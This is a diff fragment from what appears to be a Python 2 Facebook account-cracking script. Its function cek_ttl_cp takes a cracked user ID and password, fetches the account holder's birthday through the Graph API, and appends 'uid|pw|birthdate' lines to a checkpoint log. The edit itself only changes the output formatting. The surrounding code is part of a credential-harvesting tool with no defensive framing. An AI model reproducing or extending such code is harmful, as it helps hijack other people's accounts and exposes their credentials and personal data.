@@ -262,9 +262,9 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[1;93m[WIZZYB-CP]\033[1;91m %s | %s | %s %s %s"%(uid, pw, day, month, year))
-			cp.append("%s | %s"%(uid, pw))
-			open("CP/%s.txt"%(tanggal),"a").write(" + %s | %s | %s %s %s\n"%(uid, pw, day, month, year))
+			print("\r\033[1;93m[WIZZYB-CP]\033[1;91m %s|%s|%s %s %s"%(uid, pw, day, month, year))
+			cp.append("%s|%s"%(uid, pw))
+			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
 		day = (" ")
 		month = (" ")
